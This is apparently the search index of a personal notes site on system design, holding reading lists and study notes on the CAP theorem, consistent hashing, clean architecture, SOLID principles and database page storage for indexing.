</ul>"},{"location":"system-design/courses/#vignesh-sekar","title":"Vignesh Sekar","text":""},{"location":"system-design/courses/#operating-system","title":"Operating System","text":"<ul> <li>Operating Systems from scratch - Part 1</li> <li>Operating Systems from scratch - Part 2</li> <li>Operating Systems Part 3 : Synchronization and Deadlock</li> <li>Operating Systems Final Part (4) : File Systems &amp; Threads</li> </ul>"},{"location":"system-design/courses/#database-management-system","title":"Database Management System","text":"<ul> <li>Database Management System from scratch - Part 1</li> <li>Database Management System from scratch - Part 2</li> <li>Database Management Systems Part 3 : SQL Interview Course</li> <li>Database Management Systems Part 4 : Transactions</li> <li>Database Management Final Part (5): Indexing,B Trees,B+Trees</li> </ul>"},{"location":"system-design/courses/#computer-architecture-organization","title":"Computer Architecture &amp; Organization","text":"<ul> <li>Computer Architecture &amp; Organization</li> <li>Computer Architecture &amp; Organization Part 2 : Hard Disk</li> </ul>"},{"location":"system-design/courses/#data-structures","title":"Data Structures","text":"<ul> <li>Data Structures &amp; Algorithms Blueprint - Part 1 (of 2)</li> </ul>"},{"location":"system-design/courses/#discrete-math","title":"Discrete Math","text":"<ul> <li>Discrete Math Series : Set Theory &amp; Algebra masterclass</li> <li>Discrete Math Series : Propositional Logic masterclass</li> </ul>"},{"location":"system-design/courses/#automata-and-compiler-design","title":"Automata and compiler Design","text":"<ul> <li>Theory of Computation : Become a master of DFA</li> </ul>"},{"location":"system-design/high-level/","title":"High Level System Design","text":""},{"location":"system-design/high-level/#udemy","title":"Udemy","text":"<p>Note: Remaining Portions are not organized</p> <p>Move this to somewhere else</p>"},{"location":"system-design/high-level/#blogs","title":"Blogs","text":"<ul> <li>JSON is incredibly slow: Here's What's Faster!</li> <li>Understanding CORS</li> <li>6 Cache Strategies to Save Your Database's Performance</li> <li>Load Balancer vs Reverse Proxy vs API Gateway</li> <li>Free E-BOOK on Design Patterns In Use</li> <li>6 System Design Interview Concepts</li> <li>System Design Interview Question: Design Spotify</li> <li>REST API Design Best Practices</li> <li>API Design 101: From Basics to Best Practices</li> <li>Most Common Software Architecture Styles</li> <li>Top 15 Software Development Trends in 2024</li> <li>Message Queueing versus Event Streaming</li> <li>10 microservices design patterns for better architecture</li> <li>Top 10 Microservice Anti-Patterns</li> <li>23 Must-Know Principles in Software Architecture</li> <li>10 Fundamental Cloud-Native Architecture Patterns</li> <li>Event Driven Design: The Dual Write Problem</li> <li>Why is Event Sourcing so useful in Domain Driven Design?</li> <li>Event Driven Systems-Lessons from the Trenches</li> <li>Mastering Software Architecture Patterns: A Comprehensive Guide</li> <li>Mastering Software Complexity: Object-Oriented vs. Process-Oriented Approaches in Development</li> <li>Adopting Domain-First Thinking in Modular Monolith with Hexagonal Architecture</li> <li>Event Driven Architecture, The Hard Parts : Events Vs Messages</li> <li>How I Redesigned The Backend To Quickly Handle Millions Of Reads (And Writes)</li> <li>WEBRTC: Free and Direct Data Transfer</li> <li>Strong Consistency vs Eventual Consistency</li> <li>Saga, CDC with Transactional Inbox/Outbox</li> <li>Load Balancing: System Design Fundamentals</li> <li>Horizontal vs Vertical Scaling: Scalability (System Design)</li> <li>Concurrent Writes in Distributed Systems</li> <li>Introduction to API Rate Limiting: Understanding the Basics and Its Importance</li> </ul>"},{"location":"system-design/high-level/concepts/adaptive-bitrate-streaming/","title":"Adaptive Birtate Streaming","text":""},{"location":"system-design/high-level/concepts/adaptive-bitrate-streaming/#youtube","title":"Youtube","text":"<ul> <li>What is Adaptive Bitrate Streaming? | Video Streaming Explained</li> </ul>"},{"location":"system-design/high-level/concepts/api-gateway/","title":"API Gateway","text":""},{"location":"system-design/high-level/concepts/api-gateway/#youtube","title":"Youtube","text":"<ul> <li>API GATEWAY and Microservices Architecture | How API Gateway act as a Single Entry Point?</li> </ul>"},{"location":"system-design/high-level/concepts/api/","title":"API related things","text":""},{"location":"system-design/high-level/concepts/api/#youtube","title":"Youtube","text":""},{"location":"system-design/high-level/concepts/api/#single-videos","title":"Single Videos","text":"<ul> <li>API Gateway vs Load Balancer | System Design</li> <li>REST vs GraphQL | System Design</li> <li>Server-Sent Events vs WebSockets | System Design</li> <li>Event Sourcing VS CRUD | System Design</li> <li> <p>HTTP/1.1 vs HTTP/2 vs HTTP/3 | System Design</p> </li> <li> <p>CORS Explained - Cross-Origin Resource Sharing</p> </li> <li> <p>Understand Attacks: CSRF, XSS, CORS, SQL Injection with DEMO | Spring Security</p> </li> </ul>"},{"location":"system-design/high-level/concepts/asynchronus-communication/","title":"Asynchronus communication related things","text":""},{"location":"system-design/high-level/concepts/asynchronus-communication/#youtube","title":"Youtube","text":""},{"location":"system-design/high-level/concepts/asynchronus-communication/#single-videos","title":"Single Videos","text":"<ul> <li>Message Queues vs Pub/Sub | System Design</li> </ul>"},{"location":"system-design/high-level/concepts/asynchronus-communication/#playlists","title":"Playlists","text":"<ul> <li>Data Architecture Basics with Adam Bellemare</li> </ul>"},{"location":"system-design/high-level/concepts/back-of-envelope-calculation/","title":"Back of Envelope Calculation","text":""},{"location":"system-design/high-level/concepts/back-of-envelope-calculation/#youtube","title":"Youtube","text":"<ul> <li>Back of Envelope Calculation - System Design Concept</li> <li>8. Back-Of-The-Envelope Estimation for System Design Interview | Capacity Planning of Facebook | HLD</li> </ul>"},{"location":"system-design/high-level/concepts/back-of-envelope-calculation/#websites","title":"Websites","text":"<ul> <li>Back-of-the-envelope Estimation</li> </ul>"},{"location":"system-design/high-level/concepts/back-of-envelope-calculation/#theory","title":"Theory","text":"<p>Back of envelope calculation is a technique used to quickly estimate values and check the feasibility of a system design. It involves making reasonable approximations and simplifying assumptions to get rough, order-of-magnitude answers.</p> <p>Some common approximations:</p> <ul> <li> <p>Seconds in a day: \\(24 \\times 60 \\times 60 = 86,400 \\approx 100,000\\) (1 Lakh)</p> </li> <li> <p>Bytes and Bits: \\(1\\) Byte \\(= 8\\) bits (sometimes approximated as \\(10\\) bits for easier calculations)</p> </li> </ul> <p>These quick calculations help engineers estimate storage, bandwidth, or processing requirements without needing precise numbers. The goal is to validate ideas and catch obvious issues early in the design process.</p>"},{"location":"system-design/high-level/concepts/bloom-filters/","title":"Bloom filters","text":""},{"location":"system-design/high-level/concepts/bloom-filters/#youtube","title":"Youtube","text":"<ul> <li>What are Bloom Filters? | System Design</li> </ul>"},{"location":"system-design/high-level/concepts/cap-theorm/","title":"CAP Theorm","text":""},{"location":"system-design/high-level/concepts/cap-theorm/#youtube","title":"Youtube","text":"<ul> <li>2. CAP Theorem (Hindi) | High Level Design for Beginners | CAP Partition Tolerance explained</li> <li>CAP Theorem (English Dubbed) | Better with 1.25x playback speed</li> </ul>"},{"location":"system-design/high-level/concepts/cap-theorm/#theory","title":"Theory","text":""},{"location":"system-design/high-level/concepts/cap-theorm/#introduction","title":"Introduction:","text":"<ul> <li>Discusses the concept of CAP Theorem (Consistency, Availability, Partition Tolerance) and its relevance in distributed systems.</li> <li>Emphasizes the importance of considering CAP constraints early in system design to avoid costly changes later.</li> </ul>"},{"location":"system-design/high-level/concepts/cap-theorm/#cap-theorem","title":"CAP Theorem:","text":"<ul> <li>CAP: Stands for Consistency, Availability, Partition Tolerance.</li> <li>Desired Properties of Distributed Systems: These three properties are desirable in a distributed system.</li> <li>CAP Trade-off: You cannot have all three properties simultaneously. You must choose two out of the three.</li> <li>Example:<ul> <li>Consider a distributed database with nodes in India and the US.</li> <li>A user's data is replicated across both locations.</li> <li>A distributed system should ideally be consistent (same data everywhere), available (responding to requests), and tolerant to partitions (network disruptions).</li> </ul> </li> </ul>"},{"location":"system-design/high-level/concepts/cap-theorm/#understanding-each-property","title":"Understanding Each Property:","text":"<ul> <li>Consistency: Ensures that all nodes have the same, up-to-date data at any given time.</li> <li>Availability: Guarantees that every request is successfully processed by at least one node.</li> <li>Partition Tolerance: Allows the system to continue functioning even if communication between nodes is disrupted.</li> </ul>"},{"location":"system-design/high-level/concepts/cap-theorm/#why-cap-properties-cannot-co-exist","title":"Why CAP Properties Cannot Co-Exist:","text":"<ul> <li>Case 1: CA (Consistency and Availability) - Not possible with Partition Tolerance<ul> <li>Scenario: A partition occurs, separating nodes A and B.</li> <li>Conflict: Node A writes updated data, but node B cannot access it due to the partition.</li> <li>Result: Inconsistency between nodes.</li> </ul> </li> <li>Case 2: CP (Consistency and Partition Tolerance) - Not possible with Availability<ul> <li>Scenario: A partition occurs, separating nodes A and B.</li> <li>Strategy: To maintain consistency, only one node (A) is allowed to process writes.</li> <li>Result: Node B becomes unavailable for writes during the partition.</li> </ul> </li> <li>Case 3: AP (Availability and Partition Tolerance) - Not possible with Consistency<ul> <li>Scenario: A partition occurs, separating nodes A and B.</li> <li>Strategy: To maintain availability, both nodes can process writes.</li> <li>Result: Potential for inconsistent data between nodes.</li> </ul> </li> </ul>"},{"location":"system-design/high-level/concepts/cap-theorm/#cap-trade-off-in-real-world-systems","title":"CAP Trade-off in Real-world Systems:","text":"<ul> <li>Importance of Partition Tolerance: In today's distributed systems, network disruptions are common.</li> <li>Choosing between CP and AP:<ul> <li>CP: Choose this option for systems where consistency is critical, even if it means some temporary downtime.</li> <li>AP: Choose this option for systems where availability is paramount, even if it means some data inconsistency.</li> </ul> </li> </ul>"},{"location":"system-design/high-level/concepts/cap-theorm/#key-takeaways","title":"Key Takeaways:","text":"<ul> <li>Understanding CAP is crucial for effective distributed system design.</li> <li>Early consideration of CAP constraints can prevent costly changes later.</li> <li>The choice between CP and AP depends on the specific needs of your system.</li> <li>Partition tolerance is a key factor in modern distributed systems.</li> </ul>"},{"location":"system-design/high-level/concepts/cdc/","title":"Change Data Capture","text":""},{"location":"system-design/high-level/concepts/cdc/#youtube","title":"Youtube","text":"<ul> <li>What Is Change Data Capture - Understanding Data Engineering 101</li> <li> <p>Change Data Capture (CDC) | Why &amp; How | Use case | System Design</p> </li> <li> <p>Change Data Capture (CDC) Explained (with examples)</p> </li> <li>Stream your PostgreSQL changes into Kafka with Debezium</li> <li>irtiza07/postgres_debezium_cdc</li> <li>Set up Debezium, Apache Kafka and Postgres for real time Data Streaming | Real Time ETL | ETL</li> <li>hnawaz007/pythondataanalysis/tree/main/kafka</li> <li> <p>How to Stream Data from PostgreSQL to Kafka</p> </li> <li> <p>Why use Change Data Capture | Batch Data vs Streaming Data</p> </li> <li>Debezium - Change Data Capture Made Easy | Distributed Systems Deep Dives With Ex-Google SWE</li> </ul> <p>Read the blogs later again and apply</p>"},{"location":"system-design/high-level/concepts/cdc/#medium","title":"Medium","text":"<ul> <li>Building a Real-Time CDC Data Application Using Debezium, SQL Server, Docker, Consumer App, and AWS Athena -Part 1</li> <li>Building a Scalable Real-Time ETL Pipeline with Kafka, Debezium, Flink, Airflow, MinIO, and ClickHouse</li> <li> <p>Real-Time Data Streaming: Monitoring Database Changes with Postgres, Debezium, and Kafka</p> </li> <li> <p>Kafka, Debezium CDC, Kafka Connect: 12-Day Guide</p> </li> <li> <p>Enterprise CDC Architecture: Oracle to Kafka with GoldenGate</p> </li> <li>Part 1: Preparing Oracle for GoldenGate-based Streaming</li> <li>Part 2: GoldenGate Extract\u200a\u2014\u200aCapturing Oracle Transactions Efficiently</li> <li>Part 3: Streaming Oracle Changes to Kafka with Replicat</li> <li>Part 4: Customizing Kafka Payloads and Message Keys</li> <li> <p>Part 5: Tuning &amp; Hardening Your CDC Pipeline</p> </li> <li> <p>Kafka + Debezium CDC vs. Cron ETL (Trade-offs, Cost, and When to Choose Which)</p> </li> </ul>"},{"location":"system-design/high-level/concepts/cdn/","title":"Design Content Delivery Network","text":""},{"location":"system-design/high-level/concepts/cdn/#youtube","title":"Youtube","text":""},{"location":"system-design/high-level/concepts/cdn/#introduction","title":"Introduction","text":"<ul> <li>How a CDN Works | System Design</li> <li>How does Netflix's CDN scale to over 100TB/s? | System Design</li> </ul>"},{"location":"system-design/high-level/concepts/clean-architecture/","title":"Clean Architecture","text":""},{"location":"system-design/high-level/concepts/clean-architecture/#blogs-and-websites","title":"Blogs and websites","text":"<ul> <li>A quick introduction to clean architecture</li> <li> <p>The SOLID Principles of Object-Oriented Programming Explained in Plain English</p> </li> <li> <p>SOLID Principles with Real Life Examples</p> </li> <li> <p>What is Inversion of Control?</p> </li> <li>What is dependency injection?</li> </ul>"},{"location":"system-design/high-level/concepts/clean-architecture/#medium","title":"Medium","text":"<ul> <li>The S.O.L.I.D Principles in Pictures</li> <li>The 7 Most Important Software Design Patterns</li> <li>Understanding Inversion of Control (IoC) Principle</li> </ul>"},{"location":"system-design/high-level/concepts/clean-architecture/#theory","title":"Theory","text":""},{"location":"system-design/high-level/concepts/clean-architecture/#key-concepts","title":"Key Concepts","text":"<ul> <li>What is web service? - A software system designed to support interoperable machine-to-machine interaction over a network</li> <li>What is MQ? - Message Queue, a form of asynchronous service-to-service communication used in serverless and microservices architectures</li> <li>What is SOAP web service? - Simple Object Access Protocol, a messaging protocol for exchanging structured information in web services</li> <li>What is REST web service? - Representational State Transfer, an architectural style for designing networked applications using HTTP methods</li> <li>What is WSDL? - Web Services Description Language, an XML format for describing network services and their operations</li> <li>What is Clean Architecture? - A software design philosophy that separates concerns into layers, making code more maintainable and testable</li> </ul>"},{"location":"system-design/high-level/concepts/clean-architecture/#solid-principles","title":"SOLID Principles","text":"<ul> <li>Single Responsibility Principle (SRP) - A class should have only one reason to change, focusing on a single responsibility</li> <li>Open-Closed Principle (OCP) - Software entities should be open for extension but closed for modification</li> <li>Liskov Substitution Principle (LSP) - Objects of a superclass should be replaceable with objects of its subclasses without breaking functionality</li> <li>Interface Segregation Principle (ISP) - Clients should not be forced to depend on interfaces they don't use</li> <li>Dependency Inversion Principle (DIP) - High-level modules should not depend on low-level modules; both should depend on abstractions</li> </ul>"},{"location":"system-design/high-level/concepts/clean-architecture/#common-design-patterns","title":"Common Design Patterns","text":"<ul> <li>Singleton - Ensures a class has only one instance and provides global access to it</li> <li>Factory Method - Creates objects without specifying their exact classes</li> <li>Strategy - Defines a family of algorithms and makes them interchangeable</li> <li>Observer - Defines a one-to-many dependency between objects for automatic notifications</li> <li>Builder - Constructs complex objects step by step</li> <li>Adapter - Allows incompatible interfaces to work together</li> <li>State - Allows an object to alter its behavior when its internal state changes</li> </ul>"},{"location":"system-design/high-level/concepts/code-documentation/","title":"Learning a new codebase and code documentation","text":""},{"location":"system-design/high-level/concepts/code-documentation/#youtube","title":"Youtube","text":"<ul> <li>My Favorite Way to Learn a New Codebase</li> <li>How to Document Your Code Like a Pro</li> </ul>"},{"location":"system-design/high-level/concepts/concepts/","title":"Concepts","text":""},{"location":"system-design/high-level/concepts/concepts/#blogs","title":"Blogs","text":"<ul> <li> <p>Algorithms you should know before you take system design interviews</p> </li> <li> <p>Why Learn System Design  </p> </li> <li>How to Learn System Design  </li> <li>Client-Server Architecture  </li> <li>IP Addresses &amp; Ports  </li> <li>Domain Name System (DNS)  </li> <li>HTTP / HTTPS  </li> <li> <p>Latency &amp; Bandwidth  </p> </li> <li> <p>API Server  </p> </li> <li>API's &amp; REST  </li> <li>GraphQL (vs REST)  </li> <li>Proxy / Reverse Proxy  </li> <li>Load Balancer  </li> <li>CDN &amp; Distributed Storage  </li> <li> <p>Content Delivery Network (CDN) Deep Dive  </p> </li> <li> <p>Database Fundamentals</p> </li> <li>SQL vs NoSQL  </li> <li>Indexing  </li> <li>Replication  </li> <li>Sharding  </li> <li>Vertical Partitioning  </li> <li> <p>Denormalization  </p> </li> <li> <p>Scalability (Vertical vs Horizontal)  </p> </li> <li>Consistency  </li> <li>Availability &amp; Reliability  </li> <li>CAP Theorem  </li> <li>Caching  </li> <li>Blob/Object Storage  </li> <li> <p>Text-Based Search &amp; Async Processing  </p> </li> <li> <p>Microservices Architecture  </p> </li> <li>Service Discovery  </li> <li>API Gateway  </li> <li>Message Queues (e.g., Kafka, RabbitMQ)  </li> <li>Web Sockets  </li> <li>Web Hooks  </li> <li> <p>Health Checks &amp; Circuit Breakers  </p> </li> <li> <p>Rate Limiting  </p> </li> <li>Idempotency  </li> <li>Throttling &amp; Backpressure  </li> <li>Authentication vs Authorization  </li> <li>OAuth &amp; JWT  </li> <li>Distributed Systems Overview  </li> <li> <p>Core Components of System Design  </p> </li> <li> <p>Architecture Patterns (Monolith, Microservices, Event-Driven)  </p> </li> <li>How to Approach System Design in Interviews  </li> <li>Resources &amp; Project Ideas for Practice  </li> </ul>"},{"location":"system-design/high-level/concepts/consistent-hashing/","title":"Consistent hashing","text":""},{"location":"system-design/high-level/concepts/consistent-hashing/#youtube","title":"Youtube","text":"<ul> <li> <p>Consistent Hashing - System Design</p> </li> <li> <p>6. Consistent Hashing in Hindi with Example | System Design - Consistent Hashing | High Level design</p> </li> <li>Consistent Hashing (English Dubbed) | Better with 1.25x playback speed</li> </ul>"},{"location":"system-design/high-level/concepts/consistent-hashing/#website","title":"Website","text":"<ul> <li>Design Consistent Hashing</li> <li>Consistent Hashing Explained</li> </ul>"},{"location":"system-design/high-level/concepts/consistent-hashing/#theory","title":"Theory","text":""},{"location":"system-design/high-level/concepts/consistent-hashing/#consistent-hashing-detailed-notes","title":"Consistent Hashing: Detailed Notes","text":""},{"location":"system-design/high-level/concepts/consistent-hashing/#1-understanding-hash-functions","title":"1. Understanding Hash Functions","text":"<p>A hash function takes an input and maps it to a specific output. It is commonly used for distributing data efficiently in load balancing, caching, and sharding.</p>"},{"location":"system-design/high-level/concepts/consistent-hashing/#2-normal-hashing-modulo-based-hashing","title":"2. Normal Hashing (Modulo-Based Hashing)","text":"<p>How it works: Given N servers, data is assigned using: <code>Server Index = Hash(input) mod N</code></p> <p>Example: If N = 3 servers and input is X: <code>Server Index = Hash(X) mod 3</code> The result determines which server handles the request.</p> <p>Challenges: When a new server is added, the modulo changes to (N+1). This causes cache misses because data previously mapped to a server may now map to a different one, requiring rebalancing.</p>"},{"location":"system-design/high-level/concepts/consistent-hashing/#3-problem-of-rebalancing","title":"3. Problem of Rebalancing","text":"<p>Rebalancing means redistributing data when servers are added or removed. With normal hashing, most data must be reassigned. Consistent Hashing minimizes rebalancing.</p>"},{"location":"system-design/high-level/concepts/consistent-hashing/#4-introduction-to-consistent-hashing","title":"4. Introduction to Consistent Hashing","text":"<p>The goal is to minimize the number of keys (data) that need reassignment when a server is added or removed. In a well-designed system, only about <code>1/N</code> of the total data needs to be reassigned.</p> <p>Key Properties:</p> <ul> <li>Minimal Rebalancing:     Only <code>1/N \u00d7 (Total Number of Records)</code> needs reassignment when servers change, where N is the number of servers.</li> <li>Dynamic Scaling:     Suitable for environments where servers are frequently added or removed.     Ideal for load balancing and database sharding.</li> </ul>"},{"location":"system-design/high-level/concepts/consistent-hashing/#5-how-consistent-hashing-works","title":"5. How Consistent Hashing Works","text":"<ul> <li>Virtual Ring Structure:     Servers and data are arranged on a circular (virtual) hash ring (e.g., a ring with 12 positions).     Each server is mapped to specific points on the ring.</li> <li>Data Assignment:     A key is mapped to a position on the ring and assigned to the next available server in a clockwise direction.</li> <li>Adding/Removing Servers:     A new server takes over responsibility for a small portion of the ring.     Only the affected portion of data is reassigned.</li> </ul>"},{"location":"system-design/high-level/concepts/consistent-hashing/#6-virtual-nodes-in-consistent-hashing","title":"6. Virtual Nodes in Consistent Hashing","text":"<p>Issue: Uneven data distribution if servers are not evenly spaced. Solution: Use virtual nodes\u2014each server is mapped to multiple points on the ring, ensuring balanced distribution.</p>"},{"location":"system-design/high-level/concepts/consistent-hashing/#7-use-cases","title":"7. Use Cases","text":"<ul> <li>Load Balancing:     Distributes requests evenly across servers, minimizing disruption when scaling.</li> <li>Distributed Caching:     Used in systems like Redis and Memcached to efficiently map data to cache nodes and prevent frequent cache misses.</li> <li>Database Sharding:     Enables dynamic assignment of data to different database partitions for horizontal scaling.</li> </ul>"},{"location":"system-design/high-level/concepts/cqrs/","title":"CQRS (Command Query Responsibility Segregation)","text":""},{"location":"system-design/high-level/concepts/cqrs/#youtube","title":"Youtube","text":"<ul> <li>CQRS System Design Pattern</li> </ul>"},{"location":"system-design/high-level/concepts/database-indexing/","title":"DBMS Indexing to improve search query performance","text":""},{"location":"system-design/high-level/concepts/database-indexing/#youtube","title":"Youtube","text":"<ul> <li>21. Database Indexing: How DBMS Indexing done to improve search query performance? Explained</li> </ul>"},{"location":"system-design/high-level/concepts/database-indexing/#theory","title":"Theory","text":""},{"location":"system-design/high-level/concepts/database-indexing/#what-is-database-indexing","title":"What is Database Indexing?","text":"<p>Database indexing is a data structure technique used to quickly locate and access data in a database without scanning every row. An index creates a separate data structure (usually a B-Tree or B+ Tree) that stores a subset of columns with pointers to the actual rows, dramatically improving query performance.</p> <p>Analogy: Think of an index like the index at the back of a textbook. Instead of flipping through every page to find a topic, you look it up in the index which tells you exactly which page to go to.</p> <p>Key Benefits: - \u26a1 Faster Query Performance: Reduces query time from O(n) to O(log n) - \ud83c\udfaf Efficient Data Retrieval: Avoids full table scans - \ud83d\udcca Better Sort Performance: Pre-sorted index structure - \ud83d\udd0d Optimized Searches: Especially for WHERE, JOIN, ORDER BY clauses</p> <p>Trade-offs: - \ud83d\udcbe Extra Storage: Indexes consume additional disk space - \u23f1\ufe0f Slower Writes: INSERT, UPDATE, DELETE operations must update indexes - \ud83e\udde0 Maintenance Overhead: Indexes need to be rebuilt/reorganized periodically</p>"},{"location":"system-design/high-level/concepts/database-indexing/#question-1-how-is-table-data-rows-actually-stored","title":"Question 1: How is Table Data (Rows) Actually Stored?","text":""},{"location":"system-design/high-level/concepts/database-indexing/#answer","title":"Answer:","text":"<p>Database tables store data in fixed-size blocks called pages or blocks. Understanding this storage mechanism is crucial for understanding how indexing improves performance.</p>"},{"location":"system-design/high-level/concepts/database-indexing/#data-pages-database-pages","title":"Data Pages (Database Pages)","text":"<p>What are Data Pages?</p> <p>A data page (also called a database page or disk page) is the smallest unit of storage that a database management system uses to read from or write to disk. It's a fixed-size block of contiguous memory, typically 4KB, 8KB, or 16KB depending on the database system.</p> <p>Page Structure:</p> <pre><code>\u250c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2510\n\u2502                    DATA PAGE (8KB)                      \u2502\n\u251c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2524\n\u2502  Page Header (96 bytes)                                 \u2502\n\u2502  \u250c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2510     \u2502\n\u2502  \u2502 Page ID: 1001                                 \u2502     \u2502\n\u2502  \u2502 Page Type: DATA_PAGE                          \u2502     \u2502\n\u2502  \u2502 Previous Page: 1000                           \u2502     \u2502\n\u2502  \u2502 Next Page: 1002                               \u2502     \u2502\n\u2502  \u2502 Free Space Start: 7800                        \u2502     \u2502\n\u2502  \u2502 Free Space End: 8000                          \u2502     \u2502\n\u2502  \u2502 Number of Records: 45                         \u2502     \u2502\n\u2502  \u2502 Checksum: 0xABCD1234                          \u2502     \u2502\n\u2502  \u2502 LSN (Log Sequence Number): 12345678           \u2502     \u2502\n\u2502  \u2514\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2518     \u2502\n\u251c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2524\n\u2502  Row Offset Array (90 bytes)                            \u2502\n\u2502  \u250c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2510     \u2502\n\u2502  \u2502 Offset[0]: 200   (points to first row)       \u2502     \u2502\n\u2502  \u2502 Offset[1]: 350   (points to second row)      \u2502     \u2502\n\u2502  \u2502 Offset[2]: 520   (points to third row)       \u2502     \u2502\n\u2502  \u2502 ...                                           \u2502     \u2502\n\u2502  \u2502 Offset[44]: 7650 (points to 45th row)        \u2502     \u2502\n\u2502  \u2514\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2518     \u2502\n\u2502                                                          \u2502\n\u2502  WHY OFFSET ARRAY IS NEEDED:                            \u2502\n\u2502  \u2022 Variable-length rows: Rows can be different sizes    \u2502\n\u2502  \u2022 Direct access: Jump to any row without scanning      \u2502\n\u2502  \u2022 Update efficiency: Relocate rows without affecting   \u2502\n\u2502    other rows' positions                                \u2502\n\u2502  \u2022 Deletion handling: Mark slots as deleted, reuse      \u2502\n\u2502    space without shifting all rows                      \u2502\n\u2502                                                          \u2502\n\u251c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2524\n\u2502  Data Records (7814 bytes)                              \u2502\n\u2502  \u250c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2510     \u2502\n\u2502  \u2502 Record 1: [id=1, name='John', age=30, ...]    \u2502     \u2502\n\u2502  \u2502 Record 2: [id=2, name='Jane', age=25, ...]    \u2502     \u2502\n\u2502  \u2502 Record 3: [id=3, name='Bob', age=35, ...]     \u2502     \u2502\n\u2502  \u2502 ...                                           \u2502     \u2502\n\u2502  \u2502 Record 45: [id=45, name='Alice', ...]         \u2502     \u2502\n\u2502  \u2514\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2518     \u2502\n\u251c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2524\n\u2502  Free Space (200 bytes)                                 \u2502\n\u2502  [Available for new records or updates]                 \u2502\n\u2514\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2518\n</code></pre> <p>Page Header Components (Detailed):</p> Component Size Description Page ID 4 bytes Unique identifier for this page Page Type 1 byte Type: DATA_PAGE, INDEX_PAGE, etc. Previous Page 4 bytes Pointer to previous page (doubly-linked list) Next Page 4 bytes Pointer to next page Free Space Start 2 bytes Byte offset where free space begins Free Space End 2 bytes Byte offset where free space ends Number of Records 2 bytes Count of records in this page Checksum 4 bytes For data integrity verification 